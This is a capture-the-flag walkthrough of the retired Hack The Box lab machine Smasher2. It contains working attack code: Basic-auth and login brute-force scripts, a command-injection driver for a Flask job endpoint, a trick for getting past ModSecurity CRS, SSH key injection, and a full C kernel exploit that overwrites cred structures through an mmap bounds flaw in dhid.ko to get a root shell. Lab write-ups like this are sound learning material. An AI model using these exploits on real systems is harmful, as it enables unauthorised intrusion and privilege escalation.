---
layout: post
title: "Smasher2: Hack The Box Walkthrough"
date: 2019-12-14 16:00:49 +0000
last_modified_at: 2019-12-14 16:00:49 +0000
category: Walkthrough
tags: ["Hack The Box", Smasher2, retired]
comments: true
image:
  feature: smasher2-htb-walkthrough.jpg
  credit: kliempictures / Pixabay
  creditlink: https://pixabay.com/photos/pi%C3%B1ata-party-celebration-birthday-1937444/
---

This post documents the complete walkthrough of Smasher2, a retired vulnerable [VM][1] created by [dzonerzy][2] and [xG0][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Smasher2 is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.135 --rate=1000                                                                                       
Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-03 02:34:22 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.135
Discovered open port 53/tcp on 10.10.10.135
Discovered open port 80/tcp on 10.10.10.135
Discovered open port 53/udp on 10.10.10.135
```

`masscan` finds several open ports. Good. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,53,80 -A --reason -oN nmap.txt 10.10.10.135
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 23:a3:55:a8:c6:cc:74:cc:4d:c7:2c:f8:fc:20:4e:5a (RSA)
|   256 16:21:ba:ce:8c:85:62:04:2e:8c:79:fa:0e:ea:9d:33 (ECDSA)
|_  256 00:97:93:b8:59:b5:0f:79:52:e1:8a:f1:4f:ba:ac:b4 (ED25519)
53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.3 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.3-Ubuntu
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
```

You know the machine is a tough nut to crack when there aren't many services to probe.

### Zone Transfer

I'm going to make a guess here.

<a class="image-popup">
![1e6856f7.png](/assets/images/posts/smasher2-htb-walkthrough/1e6856f7.png)
</a>

Lucky! :laughing: I'd better put `wonderfulsessionmanager.smasher2.htb` into `/etc/hosts`.

### Apache HTTP Server

Here's how the `http` service looks like.

<a class="image-popup">
![7678ecab.png](/assets/images/posts/smasher2-htb-walkthrough/7678ecab.png)
</a>

Right off the bat we know that Python 2.7 has something to do with the site.

### Directory/File Enumeration

Let's shoutout to `wfuzz` for a bit.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc '403,404' http://10.10.10.135/FUZZ
********************************************************
* Wfuzz 2.2.1 - The Web Fuzzer                         *
********************************************************

Target: HTTP://10.10.10.135/FUZZ
Total requests: 4594

==================================================================
ID      Response   Lines      Word         Chars          Request    
==================================================================

00702:  C=401     14 L        54 W          459 Ch        "backup"
02094:  C=200    375 L       964 W        10918 Ch        "index.html"

Total time: 123.0025
Processed Requests: 4594
Filtered Requests: 4592
Requests/sec.: 37.34881
```

Hmm. There's a `backup` directory protected by Basic authentication.

### Cracking Basic Authentication

I wrote a simple `bash` script to brute-force basic authentication, using `curl` as the main driver. The first argument is the username, and the second argument is the password. Combine the script with GNU Parallel and you get a multi-threaded brute-force utility. We don't want the script to run forever, so when we get a 200 response code, we know that's the username and password.

<div class="filename"><span>smasher.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.135
USER=$1
PASS=$2

die() {
  killall perl &>/dev/null
}

RESULT=$(curl -s \
              -w %{http_code} \
              -o /dev/null \
              --user "$USER:$PASS" \
              http://$HOST/backup/)

if [ $RESULT -eq 200 ]; then
  echo "[+] Username: $USER, Password: $PASS"
  die
fi
```

I'm making a second guess here. I don't want to run the script against the entire `rockyou.txt` which has about 14M lines. I stripped down `rockyou.txt` to words which contain 8 to 9 characters in the `[a-z]` character set. It has 1.2 million lines which is much more manageable.

I got lucky. It took about 35 mins.

<a class="image-popup">
![f9752e72.png](/assets/images/posts/smasher2-htb-walkthrough/f9752e72.png)
</a>

With that, we can finally see what's behind `/backup`.

<a class="image-popup">
![e29b58ae.png](/assets/images/posts/smasher2-htb-walkthrough/e29b58ae.png)
</a>

<div class="filename"><span>auth.py</span></div>

~~~~python
#!/usr/bin/env python
import ses
from flask import session,redirect, url_for, request,render_template, jsonify,Flask, send_from_directory
from threading import Lock
import hashlib
import hmac
import os
import base64
import subprocess
import time

def get_secure_key():
    m = hashlib.sha1()
    m.update(os.urandom(32))
    return m.hexdigest()

def craft_secure_token(content):
    h = hmac.new("HMACSecureKey123!", base64.b64encode(content).encode(), hashlib.sha256)
    return h.hexdigest()


lock = Lock()
app = Flask(__name__)
app.config['SECRET_KEY'] = get_secure_key()
Managers = {}

def log_creds(ip, c):
    with open("creds.log", "a") as creds:
        creds.write("Login from {} with data {}:{}\n".format(ip, c["username"], c["password"]))
        creds.close()

def safe_get_manager(id):
    lock.acquire()
    manager = Managers[id]
    lock.release()
    return manager

def safe_init_manager(id):
    lock.acquire()
    if id in Managers:
        del Managers[id]
    else:
            login = ["<REDACTED>", "<REDACTED>"]
            Managers.update({id: ses.SessionManager(login, craft_secure_token(":".join(login)))})
    lock.release()

def safe_have_manager(id):
    ret = False
    lock.acquire()
    ret = id in Managers
    lock.release()
    return ret

@app.before_request
def before_request():
    if request.path == "/":
        if not session.has_key("id"):
            k = get_secure_key()
            safe_init_manager(k)
            session["id"] = k
        elif session.has_key("id") and not safe_have_manager(session["id"]):
            del session["id"]
            return redirect("/", 302)
    else:
        if session.has_key("id") and safe_have_manager(session["id"]):
            pass
        else:
            return redirect("/", 302)

@app.after_request
def after_request(resp):
    return resp


@app.route('/assets/<path:filename>')
def base_static(filename):
    return send_from_directory(app.root_path + '/assets/', filename)


@app.route('/', methods=['GET'])
def index():
    return render_template("index.html")


@app.route('/login', methods=['GET'])
def view_login():
    return render_template("login.html")

@app.route('/auth', methods=['POST'])
def login():
    ret = {"authenticated": None, "result": None}
    manager = safe_get_manager(session["id"])
    data = request.get_json(silent=True)
    if data:
        try:
            tmp_login = dict(data["data"])
        except:
            pass
        tmp_user_login = None
        try:
            is_logged = manager.check_login(data)
            secret_token_info = ["/api/<api_key>/job", manager.secret_key, int(time.time())]
            try:
                tmp_user_login = {"username": tmp_login["username"], "password": tmp_login["password"]}
            except:
                pass
            if not is_logged[0]:
                ret["authenticated"] = False
                ret["result"] = "Cannot authenticate with data: %s - %s" % (is_logged[1], "Too many tentatives, wait 2 minutes!" if manager.blocked else "Try again!")
            else:
                if tmp_user_login is not None:
                    log_creds(request.remote_addr, tmp_user_login)
                ret["authenticated"] = True
                ret["result"] = {"endpoint": secret_token_info[0], "key": secret_token_info[1], "creation_date": secret_token_info[2]}
        except TypeError as e:
            ret["authenticated"] = False
            ret["result"] = str(e)
    else:
        ret["authenticated"] = False
        ret["result"] = "Cannot authenticate missing parameters."
    return jsonify(ret)


@app.route("/api/<key>/job", methods=['POST'])
def job(key):
    ret = {"success": None, "result": None}
    manager = safe_get_manager(session["id"])
    if manager.secret_key == key:
        data = request.get_json(silent=True)
        if data and type(data) == dict:
            if "schedule" in data:
                out = subprocess.check_output(['bash', '-c', data["schedule"]])
                ret["success"] = True
                ret["result"] = out
            else:
                ret["success"] = False
                ret["result"] = "Missing schedule parameter."
        else:
            ret["success"] = False
            ret["result"] = "Invalid value provided."
    else:
        ret["success"] = False
        ret["result"] = "Invalid token."
    return jsonify(ret)


app.run(host='127.0.0.1', port=5000)
~~~~

It turns out that `ses.so` is a Python module. I'm pretty sure the credential is NOT `<REDACTED>:<REDACTED>`. :laughing:

### Cracking the `auth.py` and `ses.so` puzzle

Analysis of `ses.so` tells me that it doesn't matter what the password is for DSM, it's the same as the username. Every new connection creates a new thread and a new `SessionManager` object, added to the `Managers` dictionary, referenced by `get_secure_key()`. The login credential is stored in `user_login` while `craft_secure_token(login)` is stored in `secret_key`, which is also the API key.

Brute-force (after 976 attempts) triggers a segfault in one of the threads. I guess that's where the timeout occurs at `wonderfulsessionmanager.smasher2.htb` as well. This is also where the username is revealed in the `$rsi` register when I attached `gdb` to the process `python auth.py` running locally on my machine.

<a class="image-popup">
![1ae17c69.png](/assets/images/posts/smasher2-htb-walkthrough/1ae17c69.png)
</a>

Armed with this insight, I wrote another `bash` script to brute-force only the username.

<div class="filename"><span>auth.sh</span></div>

~~~~bash
#!/bin/bash

HOST=wonderfulsessionmanager.smasher2.htb
SESS=$(mktemp -u)
USER=$1
PASS=$USER
PROXY=http://127.0.0.1:8080

die() {
  killall perl 2>/dev/null
}

curl -s \
     -c $SESS \
     -o /dev/null \
     http://$HOST/

RESULT="$(curl -s \
               -b $SESS \
               -H "Content-Type: application/json" \
               -d "{\"action\":\"auth\",\"data\":{\"username\":\"$USER\",\"password\":\"$PASS\"}}" \
               -x $PROXY \
               http://$HOST/auth)"

if grep -E ':true' <<<"$RESULT" &>/dev/null; then
  echo "[+] Username: $USER, Password: $PASS"
  echo "$RESULT"
  die
fi

# clean up
rm -rf $SESS
~~~~

<a class="image-popup">
![28bcbc94.png](/assets/images/posts/smasher2-htb-walkthrough/28bcbc94.png)
</a>

Damn. The username is Administrator? I got kicked hard in the balls man, this one!

We know the key is fixed from `auth.py`. Towards that end, I wrote one last script that parses the execution job results. The script takes in one argument: the remote command that you want to execute.

<div class="filename"><span>smasher2.sh</span></div>

~~~~bash
#!/bin/bash

HOST=wonderfulsessionmanager.smasher2.htb
CMD=$(echo $1 | sed -r "s/([^ ])/'\1'/g")
SESS=$(mktemp -u)
KEY=fe61e023b3c64d75b3965a5dd1a923e392c8baeac4ef870334fcad98e6b264f8
PROXY=http://127.0.0.1:8080

curl -c $SESS -s -o /dev/null http://$HOST
RESULT=$(curl -s -b $SESS \
              -w "%{http_code}\n" \
              -H "Content-Type: application/json" \
              -d "{\"schedule\":\"$CMD\"}" \
              -x $PROXY \
              http://$HOST/api/$KEY/job)

CODE=$(sed '$!d' <<<"$RESULT")
RESULT=$(sed '$d' <<<"$RESULT")

if [ $CODE -eq 200 ]; then
  echo -e $(echo "$RESULT" \
            | jq . \
            | sed '2!d' \
            | cut -d':' -f2- \
            | sed -e 's/^ "//' -e 's/",$//' \
      | sed 's/\\n$//')
fi

# clean up
rm -rf $SESS
~~~~

I suspect that OWASP ModSecurity Core Rule Set (CRS) is turned on because I can't execute certain commands, resulting in `403 Forbidden`.

### Bypassing CRS

It's actually pretty easy to bypass CRS with `bash` wildcards such as `[]`, `$`, and `*`. You can even bypass CRS and execure  and even string commands and arguments by wrapping them in single quote, e.g. `'e''c''h''o'`  For the record, `base64` is not prohibited.

<a class="image-popup">
![adb46146.png](/assets/images/posts/smasher2-htb-walkthrough/adb46146.png)
</a>

## Privilege Escalation

I'll just let myself in through SSH by injecting a SSH public key I control to `/home/dzonerzy/.ssh/authorized_keys`.

<a class="image-popup">
![ab5150c2.png](/assets/images/posts/smasher2-htb-walkthrough/ab5150c2.png)
</a>

There you have it.

<a class="image-popup">
![de0deba7.png](/assets/images/posts/smasher2-htb-walkthrough/de0deba7.png)
</a>

### Kernel Driver Exploitation

During enumeration of `dzonerzy`'s account, I noticed a `README` file which hinted at a double-free vulnerability.

<a class="image-popup">
![9721fc14.png](/assets/images/posts/smasher2-htb-walkthrough/9721fc14.png)
</a>

Putting on my forensic investigator's hat, I noticed that `README` was last modified on **Feb 16 2019 @ 0116hrs**. Let's find out what files are modified before that time.

<a class="image-popup">
![96b54209.png](/assets/images/posts/smasher2-htb-walkthrough/96b54209.png)
</a>

Something doesn't look right. Why is there a kernel driver modified so near the `README` file? I better copy the file to my machine for further analysis. Looking at the `strings` in the file tells me that I should probably look into the kernel driver.

<a class="image-popup">
![85e493e6.png](/assets/images/posts/smasher2-htb-walkthrough/85e493e6.png)
</a>

#### Ubuntu 18.04.2 LTS (4.15.0-45-generic)

We need to set up a target machine that is identical to the machine where the driver is loaded, in order to analyze it.

_Kernel Image_

<a class="image-popup">
![f09782cd.png](/assets/images/posts/smasher2-htb-walkthrough/f09782cd.png)
</a>

_OS Information_

<a class="image-popup">
![d766c110.png](/assets/images/posts/smasher2-htb-walkthrough/d766c110.png)
</a>

#### Live Debugging of `dhid.ko`

Suffice to say, I've set up a virtual machine (Ubuntu 18.04.2 LTS running 4.15.0-45 kernel) loaded with all the good stuff, e.g. `dhid.ko`,  `gdb` and the kernel image debug symbols a.k.a [vmlinux](https://hadibrais.wordpress.com/2017/03/13/installing-ubuntu-kernel-debugging-symbols/).

<a class="image-popup">
![e29b6fe1.png](/assets/images/posts/smasher2-htb-walkthrough/e29b6fe1.png)
</a>

I'm able to load the driver in my target machine, alright.

<a class="image-popup">
![2b11434a.png](/assets/images/posts/smasher2-htb-walkthrough/2b11434a.png)
</a>

Check out `/proc/kallsyms`. See, `dhid` sure is loaded.

<a class="image-popup">
![0565de81.png](/assets/images/posts/smasher2-htb-walkthrough/0565de81.png)
</a>

Time to load the kernel debug symbols into `gdb`.

<a class="image-popup">
![19b5e028.png](/assets/images/posts/smasher2-htb-walkthrough/19b5e028.png)
</a>

Where's my jiffies at? This is proof that the kernel debug symbols were loaded.

<a class="image-popup">
![f93b609e.png](/assets/images/posts/smasher2-htb-walkthrough/f93b609e.png)
</a>

Let's load the dynamic symbols of `dhid.ko` into `gdb` as well. We can get those symbols from `/sys/modules/dhid/sections`.

<a class="image-popup">
![60de8da1.png](/assets/images/posts/smasher2-htb-walkthrough/60de8da1.png)
</a>

We are going to load three sections of `dhid.ko` into `gdb`: `.text`, `.bss`, and `.data`. The memory addresses are in their respective files.

<a class="image-popup">
![afb9993d.png](/assets/images/posts/smasher2-htb-walkthrough/afb9993d.png)
</a>

Use `gdb` command `add-symbol-file` to load the sections. First argument must be `.text` section, followed by the sections that we want to load.

<a class="image-popup">
![4c744cf2.png](/assets/images/posts/smasher2-htb-walkthrough/4c744cf2.png)
</a>

We want to view the `fops` structure first. It contains function pointers or handlers to various operations, such as `.open`, `.read`, `.write`, `.mmap`, `.release`, etc.

<a class="image-popup">
![e570a03d.png](/assets/images/posts/smasher2-htb-walkthrough/e570a03d.png)
</a>

#### Disassembly of `dhid.ko`

Let's see what we can discover from the disassembly of the various functions.

_dev_open_

<a class="image-popup">
![13d6086e.png](/assets/images/posts/smasher2-htb-walkthrough/13d6086e.png)
</a>

_dev_release_

<a class="image-popup">
![6cf56430.png](/assets/images/posts/smasher2-htb-walkthrough/6cf56430.png)
</a>

_dev_read_

<a class="image-popup">
![8179dc83.png](/assets/images/posts/smasher2-htb-walkthrough/8179dc83.png)
</a>

_dev_mmap_

<a class="image-popup">
![76c72975.png](/assets/images/posts/smasher2-htb-walkthrough/76c72975.png)
</a>

You might ask how the hell do I know the address of the kernel functions. Well, I don't. I wrote a script that simply `grep` address from `/proc/kallsymc`.

<div class="filename"><span>symbol.sh</span></div>

~~~~bash
#!/bin/bash

ADDRESS=$(sed 's/^0x//' <<<$1)
KALLSYMS=/proc/kallsyms

grep $ADDRESS $KALLSYMS
~~~~

#### Reverse Engineering of `dev_mmap`

It should be clear by now the driver implements its own `mmap` handler in the function `dev_mmap`. The following is my attempt to reverse engineer it based on the disassembly above.

~~~~c
static int dev_mmap(struct vm_area_struct *vma) {

	int vm_size = vma->vm_end - vma->vm_start;
	int offset  = vma->vm_offset << 0xc;  

	printk(KERN_INFO "DHID Device mmap( vma_size: %x, offset: %x)\n", vm_size, offset);

	if (vm_size > 0x10000 || offset > 0x1000 || (vm_size + offset) > 0x10000) {
		printk(KERN_INFO "HID mmap failed, requested too large a chunk of memory\n");
		return -EAGAIN;
	}

	if (remap_pfn_range(vma, vma-vm_start, offset, (vma->vm_end - vma->vm_start), vma->vm_page_prot)) {
		printk(KERN_INFO "DHID mmap failed\n");
		printk(KERN_INFO "DHID mmap failed, requested too large a chunk of memory\n);
		return -EAGAIN;
	}
	printk(KERN_INFO "DHID mmap OK\n");
	return 0;
}
~~~~

Note that the function attempts to conduct some checks to make sure that memory area to be mapped stays within bounds. However, because `vm_size` is declared as a signed integer, an attacker can use a negative number to bypass this check. I wrote some C code to test it out.

<div class="filename"><span>exploit.c</span></div>

~~~~c
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {

  printf("[+] PID: %d\n", getpid());

  int fd = open("/dev/dhid", O_RDWR);
  if (fd < 0) {
    printf("[-] Open failed!\n");
    return -1;
  }
  printf("[+] Open OK fd: %d\n", fd);

  char buf[100];
  read(fd, buf, 48);
  printf("[+] Message: %s\n", buf);

  long size   = 0xf0000000; // negative number when cast as int
  long offset = 0x0;

  printf("[+] VMA size: 0x%lx (%d)\n", size, (int)size);
  printf("[+] Offset: 0x%lx\n", offset);

  unsigned int * addr = (unsigned int *)mmap((void*)0x42424000, size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);

  if (addr == MAP_FAILED) {
    perror("Failed to mmap: ");
    close(fd);
    return -1;
  }
  printf("[+] mmap OK addr: 0x%p\n", addr);
  close(fd);

  return 0;
}
~~~~

Let's do a sanity check with safe values.

<a class="image-popup">
![900cffae.png](/assets/images/posts/smasher2-htb-walkthrough/900cffae.png)
</a>

Look at the mapped address.

<a class="image-popup">
![61eab7aa.png](/assets/images/posts/smasher2-htb-walkthrough/61eab7aa.png)
</a>

Compare this to a vulnerability check with unsafe values.

<a class="image-popup">
![391721f0.png](/assets/images/posts/smasher2-htb-walkthrough/391721f0.png)
</a>

Now, look at the mapped address.

<a class="image-popup">
![90a5cc24.png](/assets/images/posts/smasher2-htb-walkthrough/90a5cc24.png)
</a>

#### Writing the Exploit

One thing that's working our way is the fact that the physical address to remap to user address is the same as the offset, which is `0x0`. Coupled with a large map size, we are mapping almost the entire system memory.

Taking a leaf from this excellent [whitepaper](https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf), I re-purposed the C code above to this.

~~~~c
#include <sys/types.h>                                          
#include <sys/stat.h>                                           
#include <sys/mman.h>                                           
#include <fcntl.h>                                              
#include <stdio.h>                                              
#include <unistd.h>                                             

int main(int argc, char *argv[]) {                              

  printf("[+] PID: %d\n", getpid());                            

  int fd = open("/dev/dhid", O_RDWR);                           
  if (fd < 0) {                                                 
    printf("[-] Open failed!\n");                               
    return -1;                                                  
  }                                                             
  printf("[+] Open OK fd: %d\n", fd);                           

  char buf[100];                                                
  read(fd, buf, 48);                                            
  printf("[+] Message: %s\n", buf);                             

  unsigned long size   = 0xf0000000;                            
  unsigned long start  = 0x42424000;                            
  unsigned long offset = 0x0;                                   

  printf("[+] VMA size: 0x%lx (%d)\n", size, (int)size);        
  printf("[+] Offset: 0x%lx\n", offset);                        

  unsigned int * addr = (unsigned int *)mmap((void*)start, size,
      PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);          

  if (addr == MAP_FAILED) {                                     
    perror("Failed to mmap: ");                                 
    close(fd);                                                  
    return -1;                                                  
  }                                                             
  printf("[+] mmap OK addr: 0x%p\n", addr);

  unsigned int uid = getuid();
  printf("[+] UID: %d\n", uid);

  unsigned int credIt = 0;
  unsigned int credNum = 0;
  while (((unsigned long)addr) < (start + size - 0x40)) {       
    credIt = 0;
    if (
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid &&
      addr[credIt++] == uid
    ) {
      credNum++;
      printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr, credNum);

      credIt = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;
      addr[credIt++] = 0;

      if (getuid() == 0) {
        puts("[+] GOT ROOT!");
        execl("/bin/sh", "-", NULL);
        puts("[-] execl failed...");
        break;
      } else {
        credIt = 0;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
        addr[credIt++] = uid;
      }
    }
    addr++;
  }
  puts("[+] Scanning loop END");
  fflush(stdout);

  int pause = getchar();
  return 0;
}
~~~~

Time to test it out on the remote machine!

<a class="image-popup">
![86b490f0.png](/assets/images/posts/smasher2-htb-walkthrough/86b490f0.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/191
[2]: https://www.hackthebox.eu/home/users/profile/1963
[3]: https://www.hackthebox.eu/home/users/profile/11652
[4]: https://www.hackthebox.eu/
